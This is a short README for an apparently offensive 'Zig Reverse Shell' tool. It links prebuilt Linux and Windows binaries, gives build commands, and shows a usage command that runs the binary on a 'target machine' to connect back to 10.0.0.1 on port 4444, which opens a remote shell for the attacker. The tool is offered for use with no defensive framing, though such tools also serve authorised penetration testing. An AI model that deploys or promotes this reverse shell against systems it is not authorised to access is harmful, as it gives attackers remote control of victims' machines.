# Zig Reverse Shell 

## Download

Get the binary for your target platform.

Linux: [Download](https://github.com/hideckies/zig-revshell/releases/download/0.0.2/revshell-linux-x86_64)  
Windows: [Download](https://github.com/hideckies/zig-revshell/releases/download/0.0.2/revshell-windows-x86_64.exe)

<br />

## Build from Source

Clone the repository and build for your target platform:

```sh
# Linux target
zig build -Dtarget=x86_64-linux

# Windows target
zig build -Dtarget=x86_64-windows
```

After that, the executable is generated under `zig-out/bin` directory.

<br />

## Usage

Execute the binary in your target machine:

```sh
./revshell 10.0.0.1 4444
```

a